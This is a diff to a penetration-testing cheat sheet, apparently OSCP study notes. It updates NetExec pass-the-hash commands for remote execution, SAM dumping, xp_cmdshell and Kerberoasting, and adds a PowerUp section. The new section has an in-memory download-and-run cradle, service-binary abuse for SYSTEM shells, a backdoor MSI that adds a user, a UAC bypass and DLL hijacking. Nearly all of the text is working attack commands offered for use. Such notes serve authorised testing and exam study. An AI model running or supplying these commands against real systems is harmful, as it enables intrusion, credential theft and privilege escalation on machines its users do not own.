@@ -14,39 +14,39 @@ General tips:
 
 ### SMB Module
 - List shares with a hash:  
-  `nxc smb <target_range> -u <user> -H <LMHASH:NTHASH> --shares`
+  `nxc smb <target_range> -u <user> -H <LMHASH:NTHASH> --continue-on-success --shares`
 - Execute a single command via SMB (default PsExec):  
-  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> -x "whoami"`
+  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -x "whoami"`
 - Force a specific exec method (PsExec, WMExec, or Atexec):  
-  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --exec-method wmiexec -x "ipconfig /all"`
+  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --exec-method wmiexec -x "ipconfig /all"`
 - Dump SAM remotely with the hash:  
-  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --sam`
+  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --sam`
 - Trigger BloodHound collection with PTH:  
-  `nxc smb <target_list.txt> -u <user> -H <LMHASH:NTHASH> -M bloodhound`
+  `nxc smb <target_list.txt> -u <user> -H <LMHASH:NTHASH> --continue-on-success -M bloodhound`
 
 ### WinRM Module
 - Spawn a remote PowerShell command:  
-  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> -x "hostname"`
+  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --local-auth --continue-on-success -x "hostname"`
 - Launch an interactive shell (PowerShell remoting):  
-  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --shell`
+  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --shell`
 
 ### RDP Module
 - Validate RDP access with a hash (no GUI, just auth check):  
-  `nxc rdp <target> -u <user> -H <LMHASH:NTHASH>`
+  `nxc rdp <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success`
 
 ### WMI Module (via SMB)
 - Run a command through WMI while authenticating over SMB with a hash:  
-  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --wmi "powershell.exe -ExecutionPolicy Bypass -Command whoami"`
+  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --wmi "powershell.exe -ExecutionPolicy Bypass -Command whoami"`
 
 ### RPC/DCOM Module
 - Execute commands via DCOM using pass-the-hash:  
-  `nxc rpc <target> -u <user> -H <LMHASH:NTHASH> -M exec -o COMMAND="whoami"`
+  `nxc rpc <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -M exec -o COMMAND="whoami"`
 
 ### MSSQL Module
 - Connect to SQL Server with pass-the-hash and enable xp_cmdshell:  
-  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"`
+  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"`
 - Execute OS command through xp_cmdshell:  
-  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> -Q "EXEC xp_cmdshell 'whoami'"`  
+  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -Q "EXEC xp_cmdshell 'whoami'"`  
   (requires xp_cmdshell already enabled)
 
 ---
@@ -92,7 +92,7 @@ All Impacket examples accept `-hashes <LMHASH:NTHASH>` for pass-the-hash; use `-
 ### Kerberos & Ticket Operations
 - Use pass-the-hash with Kerberos (no password required):  
   `GetUserSPNs.py <domain>/<user> -hashes <LMHASH:NTHASH> -dc-ip <dc_ip>`
-  `nxc ldap <dc_ip> -u <user> -p <pass> --kerberoasting output.txt --kdcHost DC01.oscp.exam`
+  `nxc ldap <dc_ip> -u <user> -p <pass> --continue-on-success --kerberoasting output.txt --kdcHost DC01.oscp.exam`
 - Request TGT using NT hash (pass-the-key):  
   `getTGT.py <domain>/<user> -hashes <LMHASH:NTHASH>`
 - Relay NTLM across protocols for lateral moves:  
@@ -149,6 +149,28 @@ Run Mimikatz from an elevated context (Administrator) and enable debug privilege
 - `sekurlsa::minidump` – Switch LSASS target back to live memory after using minidumps.
 - `privilege::debug /restore` – Drop debug privilege when done.
 - `exit` – Close Mimikatz cleanly.
+
+---
+
+## PowerUp.ps1 Quick Wins
+
+PowerUp (PowerSploit) remains a fast way to escalate Windows access after landing on a host. Pull it in over HTTP/SMB or drop a local copy, then let it enumerate and weaponize common misconfigurations for you.
+
+- Load the module in-memory or offline:  
+  `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`  
+  `powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"` (execute from a local copy)
+- Core enumeration aliases:  
+  `Invoke-AllChecks` (alias of `Invoke-PrivescAudit`) runs every check and prints exploitation hints.  
+  `Get-UnquotedService`, `Get-ModifiableServiceFile`, `Get-ModifiableService` spotlight service-based privilege-escalation.  
+  `Get-ModifiableScheduledTaskFile`, `Get-ModifiableRegistryAutoRun` surface writable scheduled tasks and autoruns.  
+  `Get-RegistryAlwaysInstallElevated`, `Get-RegistryAutoLogon` alert on MSI/UAC misconfigs and stored logons.  
+  `Get-UnattendedInstallFile`, `Get-WebConfig`, `Get-ApplicationHost`, `Get-SiteListPassword`, `Get-CachedGPPPassword` hunt for clear-text credentials across the file system.
+- Built-in exploitation helpers:  
+  `Invoke-ServiceAbuse -ServiceName <svc> -Command "cmd.exe /c <payload>"` swaps binaries and restarts services for quick SYSTEM shells.  
+  `Write-ServiceBinary -ServiceName <svc> -Path C:\Temp\payload.exe` and `Restore-ServiceBinary` manage replacements cleanly.  
+  `Write-UserAddMSI -Output C:\Temp\backdoor.msi` weaponizes AlwaysInstallElevated with a user-creation MSI.  
+  `Invoke-EventVwrBypass -Command "cmd.exe /c <payload>"` delivers a ready-made UAC bypass.  
+  `Find-ProcessDLLHijack`, `Find-PathDLLHijack`, and `Write-HijackDll` chain DLL hijacks when writable directories are discovered.
 
 ---
 
